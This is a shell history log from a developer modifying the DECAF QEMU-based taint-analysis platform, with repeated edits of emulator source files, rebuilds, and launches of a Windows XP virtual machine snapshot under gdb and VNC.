+  853  ~/DECAF/decaf/i386-softmmu/qemu-system-i386 -monitor stdio -m 4096 -usbdevice tablet -vnc :2 -netdev user,id=mynet -device ne2k_pci,netdev=mynet ~/WinXP_clean_snapshot.qcow2 -incoming tcp:0:6666
+  854  clear
+  855  vim vl.c 
+  856  make
+  857  ~/DECAF/decaf/i386-softmmu/qemu-system-i386 -monitor stdio -m 4096 -usbdevice tablet -vnc :2 -netdev user,id=mynet -device ne2k_pci,netdev=mynet ~/WinXP_clean_snapshot.qcow2 -incoming tcp:0:6666
+  858  vim vl.c 
+  859  ~/DECAF/decaf/i386-softmmu/qemu-system-i386 -monitor stdio -m 4096 -usbdevice tablet -vnc :2 -netdev user,id=mynet -device ne2k_pci,netdev=mynet ~/WinXP_clean_snapshot.qcow2 -incoming tcp:0:6666
+  860  vim vl.c 
+  861  ~/DECAF/decaf/i386-softmmu/qemu-system-i386 -monitor stdio -m 4096 -usbdevice tablet -vnc :2 -netdev user,id=mynet -device ne2k_pci,netdev=mynet ~/WinXP_clean_snapshot.qcow2 -incoming tcp:0:6666
+  862  gdb ~/DECAF/decaf/i386-softmmu/qemu-system-i386 -monitor stdio -m 4096 -usbdevice tablet -vnc :2 -netdev user,id=mynet -device ne2k_pci,netdev=mynet ~/WinXP_clean_snapshot.qcow2 -incoming tcp:0:6666
+  863  sudo apt-get install gdb -yy
+  864  sudo apt-get install gdb -y
+  865  gdb ~/DECAF/decaf/i386-softmmu/qemu-system-i386 -monitor stdio -m 4096 -usbdevice tablet -vnc :2 -netdev user,id=mynet -device ne2k_pci,netdev=mynet ~/WinXP_clean_snapshot.qcow2 -incoming tcp:0:6666
+  866  gdb ~/DECAF/decaf/i386-softmmu/qemu-system-i386 -m 4096 -usbdevice tablet -vnc :2 -netdev user,id=mynet -device ne2k_pci,netdev=mynet ~/WinXP_clean_snapshot.qcow2 -incoming tcp:0:6666
+  867  gdb ~/DECAF/decaf/i386-softmmu/qemu-system-i386-usbdevice tablet -vnc :2 -netdev user,id=mynet -device ne2k_pci,netdev=mynet ~/WinXP_clean_snapshot.qcow2 -incoming tcp:0:6666
+  868  gdb ~/DECAF/decaf/i386-softmmu/qemu-system-i386 -usbdevice tablet -vnc :2 -netdev user,id=mynet -device ne2k_pci,netdev=mynet ~/WinXP_clean_snapshot.qcow2 -incoming tcp:0:6666
+  869  gdb ~/DECAF/decaf/i386-softmmu/qemu-system-i386 ~/WinXP_clean_snapshot.qcow2 -incoming tcp:0:6666
+  870  gdb ~/DECAF/decaf/i386-softmmu/qemu-system-i386 ~/WinXP_clean_snapshot.qcow2
+  871  gdb ~/DECAF/decaf/i386-softmmu/qemu-system-i386 ~/WinXP_clean_snapshot.qcow2 -vnc :0
+  872  gdb ~/DECAF/decaf/i386-softmmu/qemu-system-i386 -vnc :0  ~/WinXP_clean_snapshot.qcow2
+  873  gdb ~/DECAF/decaf/i386-softmmu/qemu-system-i386 -vnc :0,  ~/WinXP_clean_snapshot.qcow2
+  874  gdb ~/DECAF/decaf/i386-softmmu/qemu-system-i386 -vnc :0  ~/WinXP_clean_snapshot.qcow2
+  875  gdb ~/DECAF/decaf/i386-softmmu/qemu-system-i386  ~/WinXP_clean_snapshot.qcow2
+  876  q
+  877  clear
+  878  gdb ~/DECAF/decaf/i386-softmmu/qemu-system-i386  ~/WinXP_clean_snapshot.qcow2
+  879  q
+  880  clear
+  881  gdb ~/DECAF/decaf/i386-softmmu/qemu-system-i386  ~/WinXP_clean_snapshot.qcow2
+  882  q
+  883  gdb ~/DECAF/decaf/i386-softmmu/qemu-system-i386  ~/WinXP_clean_snapshot.qcow2
+  884  cd ~
+  885  clear
+  886  ls
+  887  ~/DECAF/decaf/i386-softmmu/qemu-system-i386 -monitor stdio -m 4096 -usbdevice tablet -vnc :3 -netdev user,id=mynet -device ne2k_pci,netdev=mynet ~/WinXP_clean_snapshot.qcow2 
+  888  lsof -i:5903
+  889  kill -9 21679
+  890  ~/DECAF/decaf/i386-softmmu/qemu-system-i386 -monitor stdio -m 4096 -usbdevice tablet -vnc :3 -netdev user,id=mynet -device ne2k_pci,netdev=mynet ~/WinXP_clean_snapshot.qcow2 
+  891  cd ~
+  892  clear
+  893  ls
+  894  cd DECAF/decaf/
+  895  clear
+  896  gdb ~/DECAF/decaf/i386-softmmu/qemu-system-i386 ~/WinXP_clean_snapshot.qcow2 
+  897  q
+  898  clear
+  899  gdb ~/DECAF/decaf/i386-softmmu/qemu-system-i386 ~/WinXP_clean_snapshot.qcow2 
+  900  clear
+  901  ~/DECAF/decaf/i386-softmmu/qemu-system-i386 -monitor stdio -m 4096 -usbdevice tablet -vnc :3 -netdev user,id=mynet -device ne2k_pci,netdev=mynet ~/WinXP_clean_snapshot.qcow2  -incoming tcp:0:6666
+  902  cd ~
+  903  clear
+  904  cd DECAF/decaf/
+  905  vim vl.c 
+  906  make
+  907  ~/DECAF/decaf/i386-softmmu/qemu-system-i386 -monitor stdio -m 4096 -usbdevice tablet -vnc :3 -netdev user,id=mynet -device ne2k_pci,netdev=mynet ~/WinXP_clean_snapshot.qcow2 
+  908  ~/DECAF/decaf/i386-softmmu/qemu-system-i386 -monitor stdio -m 4096 -usbdevice tablet -vnc :2 -netdev user,id=mynet -device ne2k_pci,netdev=mynet ~/WinXP_clean_snapshot.qcow2 
+  909  cd ~
+  910  clear
+  911  cd DECAF/decaf/
+  912  clear
+  913  ~/DECAF/decaf/i386-softmmu/qemu-system-i386 -monitor stdio -m 4096 -usbdevice tablet -vnc :3 -netdev user,id=mynet -device ne2k_pci,netdev=mynet ~/WinXP_clean_snapshot.qcow2  -incoming tcp:0:6666
+  914  lsof -i:5903
+  915  kill -9 29465
+  916  ~/DECAF/decaf/i386-softmmu/qemu-system-i386 -monitor stdio -m 4096 -usbdevice tablet -vnc :3 -netdev user,id=mynet -device ne2k_pci,netdev=mynet ~/WinXP_clean_snapshot.qcow2  -incoming tcp:0:6666
+  917  ~/DECAF/decaf/i386-softmmu/qemu-system-i386  ~/WinXP_clean_snapshot.qcow2 
+  918  gdb ~/DECAF/decaf/i386-softmmu/qemu-system-i386  ~/WinXP_clean_snapshot.qcow2 
+  919  cd ~
+  920  clear
+  921  cd DECAF/decaf/
+  922  vim vl.c 
+  923  cd ~
+  924  clear
+  925  cd DECAF/decaf/
+  926  ls
+  927  clear
+  928  LS
+  929  ls
+  930  clear
+  931  gdb ~/DECAF/decaf/i386-softmmu/qemu-system-i386  ~/WinXP_clean_snapshot.qcow2 
+  932  cd ~
+  933  clear
+  934  ls
+  935  ll Win
+  936  ll Win*
+  937  cd DECAF/decaf/
+  938  clear
+  939  ls
+  940  clear
+  941  vim vl.c 
+  942  ~/DECAF/decaf/i386-softmmu/qemu-system-i386 -monitor stdio -m 4096 -usbdevice tablet -vnc :3 -netdev user,id=mynet -device ne2k_pci,netdev=mynet ~/WinXP_clean_snapshot.qcow2 
+  943  cd ~
+  944  clear
+  945  ~/DECAF/decaf/i386-softmmu/qemu-system-i386 -monitor stdio -m 4096 -usbdevice tablet -vnc :3 -netdev user,id=mynet -device ne2k_pci,netdev=mynet ~/WinXP_clean_snapshot.qcow2 
+  946  cd DECAF/decaf/
+  947  cler
+  948  clear
+  949  vim vl.c 
+  950  cd ~
+  951  clear
+  952  ls
+  953  cd DECAF/decaf/
+  954  ls
+  955  clear
+  956  gdb ~/DECAF/decaf/i386-softmmu/qemu-system-i386  ~/WinXP_clean_snapshot.qcow2 
+  957  clear
+  958  vim vl.c 
+  959  clear
+  960  ~/DECAF/decaf/i386-softmmu/qemu-system-i386 -monitor stdio -m 4096 -usbdevice tablet -vnc :3 -netdev user,id=mynet -device ne2k_pci,netdev=mynet ~/WinXP_clean_snapshot.qcow2 -incoming tcp:0:6666
+  961  clear
+  962  gdb ~/DECAF/decaf/i386-softmmu/qemu-system-i386  ~/WinXP_clean_snapshot.qcow2 
+  963  ~/DECAF/decaf/i386-softmmu/qemu-system-i386 -monitor stdio -m 4096 -usbdevice tablet -vnc :3 -netdev user,id=mynet -device ne2k_pci,netdev=mynet ~/WinXP_clean_snapshot.qcow2 -incoming tcp:0:6666
+  964  lsof -i:5903
+  965  kill 37405
+  966  kill -9 37405
+  967  ~/DECAF/decaf/i386-softmmu/qemu-system-i386 -monitor stdio -m 4096 -usbdevice tablet -vnc :3 -netdev user,id=mynet -device ne2k_pci,netdev=mynet ~/WinXP_clean_snapshot.qcow2 -incoming tcp:0:6666
+  968  ls zk.h 
+  969  clear
+  970  ~/DECAF/decaf/i386-softmmu/qemu-system-i386 -monitor stdio -m 4096 -usbdevice tablet -vnc :3 -netdev user,id=mynet -device ne2k_pci,netdev=mynet ~/WinXP_clean_snapshot.qcow2 -incoming tcp:0:6666
+  971  vim vl.c 
+  972  make
+  973  ~/DECAF/decaf/i386-softmmu/qemu-system-i386 -monitor stdio -m 4096 -usbdevice tablet -vnc :3 -netdev user,id=mynet -device ne2k_pci,netdev=mynet ~/WinXP_clean_snapshot.qcow2 -incoming tcp:0:6666
+  974  lsof -i:5903
+  975  kill -9 38284
+  976  ~/DECAF/decaf/i386-softmmu/qemu-system-i386 -monitor stdio -m 4096 -usbdevice tablet -vnc :3 -netdev user,id=mynet -device ne2k_pci,netdev=mynet ~/WinXP_clean_snapshot.qcow2 -incoming tcp:0:6666
+  977  lsof -i:5903
+  978  kill -9 38325
+  979  make
+  980  clear
+  981  ls
+  982  clear
+  983  vim vl.c 
+  984  make
+  985  ~/DECAF/decaf/i386-softmmu/qemu-system-i386 -monitor stdio -m 4096 -usbdevice tablet -vnc :3 -netdev user,id=mynet -device ne2k_pci,netdev=mynet ~/WinXP_clean_snapshot.qcow2 -incoming tcp:0:6666
+  986  4
+  987  vim vl.c 
+  988  make
+  989  ~/DECAF/decaf/i386-softmmu/qemu-system-i386 -monitor stdio -m 4096 -usbdevice tablet -vnc :3 -netdev user,id=mynet -device ne2k_pci,netdev=mynet ~/WinXP_clean_snapshot.qcow2 -incoming tcp:0:6666
+  990  '
+  991  '
+  992  clear
+  993  vim vl.c 
+  994  make
+  995  ~/DECAF/decaf/i386-softmmu/qemu-system-i386 -monitor stdio -m 4096 -usbdevice tablet -vnc :3 -netdev user,id=mynet -device ne2k_pci,netdev=mynet ~/WinXP_clean_snapshot.qcow2 -incoming tcp:0:6666
+  996  cd ~
+  997  clear
+  998  ~/DECAF/decaf/i386-softmmu/qemu-system-i386 -monitor stdio -m 4096 -usbdevice tablet -vnc :3 -netdev user,id=mynet -device ne2k_pci,netdev=mynet ~/WinXP_clean_snapshot.qcow2 
+  999  clear
+ 1000  cd DECAF/decaf/
+ 1001  clear
+ 1002  vim vl.c 
+ 1003  vim savevm.c 
+ 1004  gdb
+ 1005  lsof -i:
+ 1006  lsof -i:5903
+ 1007  gdb
+ 1008  clear
+ 1009  vim vl.c 
+ 1010  vim migration.c 
+ 1011  make
+ 1012  vim migration.c 
+ 1013  vim migration-tcp.c 
+ 1014  vim osdep.c 
+ 1015  vim migration.c 
+ 1016  make
+ 1017  vim vl.c 
+ 1018  make
+ 1019  ~/DECAF/decaf/i386-softmmu/qemu-system-i386 -monitor stdio -m 4096 -usbdevice tablet -vnc :3 -netdev user,id=mynet -device ne2k_pci,netdev=mynet ~/WinXP_clean_snapshot.qcow2 
+ 1020  ~/DECAF/decaf/i386-softmmu/qemu-system-i386 -monitor stdio -m 4096 -usbdevice tablet -vnc :2 -netdev user,id=mynet -device ne2k_pci,netdev=mynet ~/WinXP_clean_snapshot.qcow2 
+ 1021  clear
+ 1022  cd ~
+ 1023  clear
+ 1024  cd DECAF/decaf/
+ 1025  clear
+ 1026  vim savevm.c 
+ 1027  vim shared/DECAF_main.c 
+ 1028  make
+ 1029  vim shared/tainting/taint_memory.c 
+ 1030  make
+ 1031  vim shared/DECAF_main.c 
+ 1032  make
+ 1033  cd ~
+ 1034  ls
+ 1035  mkdir go
+ 1036  cd go/
+ 1037  clear
+ 1038  vim test.go
+ 1039  go run test.go 
+ 1040  sudo apt-get install gccgo-go -y
+ 1041  go run test.go 
+ 1042  vim test.go
+ 1043  go run test.go 
+ 1044  clear
+ 1045  cd -
+ 1046  cd DECAF/decaf/
+ 1047  clear
+ 1048  vim shared/tainting/taint_memory.c 
+ 1049  vim vl.c 
+ 1050  vim shared/DECAF_main.c 
+ 1051  vim shared/tainting/taint_memory.c 
+ 1052  make
+ 1053  vim shared/tainting/taint_memory.c 
+ 1054  make
+ 1055  vim shared/tainting/taint_memory.c 
+ 1056  make
+ 1057  vim shared/tainting/taint_memory.c 
+ 1058  make
+ 1059  vim shared/tainting/taint_memory.c 
+ 1060  make
+ 1061  vim vl.c
+ 1062  make
+ 1063  clear
+ 1064  cd ~
+ 1065  clear
+ 1066  ls
+ 1067  clear
+ 1068  cd qe
+ 1069  ls
+ 1070  cd DECAF/decaf/
+ 1071  clear
+ 1072  vim vl.c 
+ 1073  make
+ 1074  ~/DECAF/decaf/i386-softmmu/qemu-system-i386 -monitor stdio -m 4096 -usbdevice tablet -vnc :2 -netdev user,id=mynet -device ne2k_pci,netdev=mynet ~/WinXP_clean_snapshot.qcow2 -incoming tcp:0:6666
+ 1075  clear
+ 1076  vim vl.c 
+ 1077  make
+ 1078  clear
+ 1079  ~/DECAF/decaf/i386-softmmu/qemu-system-i386 -monitor stdio -m 4096 -usbdevice tablet -vnc :2 -netdev user,id=mynet -device ne2k_pci,netdev=mynet ~/WinXP_clean_snapshot.qcow2 -incoming tcp:0:6666
+ 1080  lsof -i:5902
+ 1081  kill -9 43502
+ 1082  ~/DECAF/decaf/i386-softmmu/qemu-system-i386 -monitor stdio -m 4096 -usbdevice tablet -vnc :2 -netdev user,id=mynet -device ne2k_pci,netdev=mynet ~/WinXP_clean_snapshot.qcow2 -incoming tcp:0:6666
+ 1083  vim vl.c 
+ 1084  make
+ 1085  ~/DECAF/decaf/i386-softmmu/qemu-system-i386 -monitor stdio -m 4096 -usbdevice tablet -vnc :2 -netdev user,id=mynet -device ne2k_pci,netdev=mynet ~/WinXP_clean_snapshot.qcow2 -incoming tcp:0:6666
+ 1086  clear
+ 1087  vim vl.c 
+ 1088  make
+ 1089  ~/DECAF/decaf/i386-softmmu/qemu-system-i386 -monitor stdio -m 4096 -usbdevice tablet -vnc :2 -netdev user,id=mynet -device ne2k_pci,netdev=mynet ~/WinXP_clean_snapshot.qcow2 -incoming tcp:0:6666
+ 1090  vim vl.c 
+ 1091  vim ./shared/DECAF_main.c 
+ 1092  make
+ 1093  vim vl.c 
+ 1094  make
+ 1095  ~/DECAF/decaf/i386-softmmu/qemu-system-i386 -monitor stdio -m 4096 -usbdevice tablet -vnc :2 -netdev user,id=mynet -device ne2k_pci,netdev=mynet ~/WinXP_clean_snapshot.qcow2 -incoming tcp:0:6666
+ 1096  vim vl.c 
+ 1097  make
+ 1098  ~/DECAF/decaf/i386-softmmu/qemu-system-i386 -monitor stdio -m 4096 -usbdevice tablet -vnc :2 -netdev user,id=mynet -device ne2k_pci,netdev=mynet ~/WinXP_clean_snapshot.qcow2 -incoming tcp:0:6666
+ 1099  vim shared/tainting/taint_memory.c 
+ 1100  make
+ 1101  ~/DECAF/decaf/i386-softmmu/qemu-system-i386 -monitor stdio -m 4096 -usbdevice tablet -vnc :2 -netdev user,id=mynet -device ne2k_pci,netdev=mynet ~/WinXP_clean_snapshot.qcow2 -incoming tcp:0:6666
+ 1102  vim shared/tainting/taint_memory.c 
+ 1103  make
+ 1104  vim shared/tainting/taint_memory.c 
+ 1105  clear
+ 1106  make
+ 1107  ~/DECAF/decaf/i386-softmmu/qemu-system-i386 -monitor stdio -m 4096 -usbdevice tablet -vnc :2 -netdev user,id=mynet -device ne2k_pci,netdev=mynet ~/WinXP_clean_snapshot.qcow2 -incoming tcp:0:6666
+ 1108  vim shared/tainting/taint_memory.c 
+ 1109  ~/DECAF/decaf/i386-softmmu/qemu-system-i386 -monitor stdio -m 4096 -usbdevice tablet -vnc :2 -netdev user,id=mynet -device ne2k_pci,netdev=mynet ~/WinXP_clean_snapshot.qcow2 -incoming tcp:0:6666
+ 1110  vim shared/tainting/taint_memory.c 
+ 1111  make
+ 1112  ~/DECAF/decaf/i386-softmmu/qemu-system-i386 -monitor stdio -m 4096 -usbdevice tablet -vnc :2 -netdev user,id=mynet -device ne2k_pci,netdev=mynet ~/WinXP_clean_snapshot.qcow2 -incoming tcp:0:6666
+ 1113  vim shared/tainting/taint_memory.c 
+ 1114  make
+ 1115  ~/DECAF/decaf/i386-softmmu/qemu-system-i386 -monitor stdio -m 4096 -usbdevice tablet -vnc :2 -netdev user,id=mynet -device ne2k_pci,netdev=mynet ~/WinXP_clean_snapshot.qcow2 -incoming tcp:0:6666
+ 1116  vim shared/tainting/taint_memory.c 
+ 1117  make
+ 1118  ~/DECAF/decaf/i386-softmmu/qemu-system-i386 -monitor stdio -m 4096 -usbdevice tablet -vnc :2 -netdev user,id=mynet -device ne2k_pci,netdev=mynet ~/WinXP_clean_snapshot.qcow2 -incoming tcp:0:6666
+ 1119  vim shared/tainting/taint_memory.c 
+ 1120  vim vl.c 
+ 1121  make
+ 1122  ~/DECAF/decaf/i386-softmmu/qemu-system-i386 -monitor stdio -m 4096 -usbdevice tablet -vnc :2 -netdev user,id=mynet -device ne2k_pci,netdev=mynet ~/WinXP_clean_snapshot.qcow2 -incoming tcp:0:6666
+ 1123  vim shared/DECAF_main.c 
+ 1124  vim shared/tainting/taint_memory.c 
+ 1125  make
+ 1126  ~/DECAF/decaf/i386-softmmu/qemu-system-i386 -monitor stdio -m 4096 -usbdevice tablet -vnc :2 -netdev user,id=mynet -device ne2k_pci,netdev=mynet ~/WinXP_clean_snapshot.qcow2 -incoming tcp:0:6666
+ 1127  make
+ 1128  ~/DECAF/decaf/i386-softmmu/qemu-system-i386 -monitor stdio -m 4096 -usbdevice tablet -vnc :2 -netdev user,id=mynet -device ne2k_pci,netdev=mynet ~/WinXP_clean_snapshot.qcow2 -incoming tcp:0:6666
+ 1129  vim shared/DECAF_main.c 
+ 1130  make
+ 1131  ~/DECAF/decaf/i386-softmmu/qemu-system-i386 -monitor stdio -m 4096 -usbdevice tablet -vnc :2 -netdev user,id=mynet -device ne2k_pci,netdev=mynet ~/WinXP_clean_snapshot.qcow2 -incoming tcp:0:6666
+ 1132  vim vl.c 
+ 1133  make
+ 1134  ~/DECAF/decaf/i386-softmmu/qemu-system-i386 -monitor stdio -m 4096 -usbdevice tablet -vnc :2 -netdev user,id=mynet -device ne2k_pci,netdev=mynet ~/WinXP_clean_snapshot.qcow2 -incoming tcp:0:6666
+ 1135  vim vl.c 
+ 1136  make
+ 1137  ~/DECAF/decaf/i386-softmmu/qemu-system-i386 -monitor stdio -m 4096 -usbdevice tablet -vnc :2 -netdev user,id=mynet -device ne2k_pci,netdev=mynet ~/WinXP_clean_snapshot.qcow2 -incoming tcp:0:6666
+ 1138  clear
+ 1139  vim shared/DECAF_main.c 
+ 1140  make
+ 1141  ~/DECAF/decaf/i386-softmmu/qemu-system-i386 -monitor stdio -m 4096 -usbdevice tablet -vnc :2 -netdev user,id=mynet -device ne2k_pci,netdev=mynet ~/WinXP_clean_snapshot.qcow2 -incoming tcp:0:6666
+ 1142  vim vl.c 
+ 1143  make
+ 1144  ~/DECAF/decaf/i386-softmmu/qemu-system-i386 -monitor stdio -m 4096 -usbdevice tablet -vnc :2 -netdev user,id=mynet -device ne2k_pci,netdev=mynet ~/WinXP_clean_snapshot.qcow2 -incoming tcp:0:6666
+ 1145  make
+ 1146  ~/DECAF/decaf/i386-softmmu/qemu-system-i386 -monitor stdio -m 4096 -usbdevice tablet -vnc :2 -netdev user,id=mynet -device ne2k_pci,netdev=mynet ~/WinXP_clean_snapshot.qcow2 -incoming tcp:0:6666
+ 1147  vim vl.c 
+ 1148  ~/DECAF/decaf/i386-softmmu/qemu-system-i386 -monitor stdio -m 4096 -usbdevice tablet -vnc :2 -netdev user,id=mynet -device ne2k_pci,netdev=mynet ~/WinXP_clean_snapshot.qcow2 -incoming tcp:0:6666
+ 1149  clear
+ 1150  cd ~
+ 1151  clear
+ 1152  ~/DECAF/decaf/i386-softmmu/qemu-system-i386 -monitor stdio -m 4096 -usbdevice tablet -vnc :3 -netdev user,id=mynet -device ne2k_pci,netdev=mynet ~/WinXP_clean_snapshot.qcow2 
+ 1153  cd DECAF/decaf/
+ 1154  clear
+ 1155  cd shared/
+ 1156  clear
+ 1157  vim DECAF_main.c 
+ 1158  ~/DECAF/decaf/i386-softmmu/qemu-system-i386 -monitor stdio -m 4096 -usbdevice tablet -vnc :3 -netdev user,id=mynet -device ne2k_pci,netdev=mynet ~/WinXP_clean_snapshot.qcow2 
+ 1159  vim DECAF_main.c 
+ 1160  cd ..
+ 1161  vim vl.c 
+ 1162  ~/DECAF/decaf/i386-softmmu/qemu-system-i386 -monitor stdio -m 4096 -usbdevice tablet -vnc :3 -netdev user,id=mynet -device ne2k_pci,netdev=mynet ~/WinXP_clean_snapshot.qcow2 
+ 1163  lsof -i:5903
+ 1164  kill -9 48934
+ 1165  ~/DECAF/decaf/i386-softmmu/qemu-system-i386 -monitor stdio -m 4096 -usbdevice tablet -vnc :3 -netdev user,id=mynet -device ne2k_pci,netdev=mynet ~/WinXP_clean_snapshot.qcow2 
+ 1166  vim savevm.
+ 1167  vim savevm.c 
+ 1168  make
+ 1169  vim shared/tainting/taint_memory.c 
+ 1170  make
+ 1171  vim shared/tainting/taint_memory.c 
+ 1172  vim savevm.c 
+ 1173  make
+ 1174  vim savevm.c 
+ 1175  make
+ 1176  vim savevm.c 
+ 1177  make
+ 1178  vim shared/tainting/taint_memory.h 
+ 1179  vim savevm.c 
+ 1180  make
+ 1181  vim shared/tainting/taint_memory.h 
+ 1182  make
+ 1183  vim shared/tainting/taint_memory.h 
+ 1184  vim shared/tainting/taint_memory.c
+ 1185  vim savevm.c 
+ 1186  make
+ 1187  vim shared/tainting/taint_memory.h
+ 1188  make
+ 1189  vim shared/tainting/taint_memory.h
+ 1190  make
+ 1191  histroy > history.log
+ 1192  history > history.log
+ 1193  sz history.log 
+ 1194  history > history.log
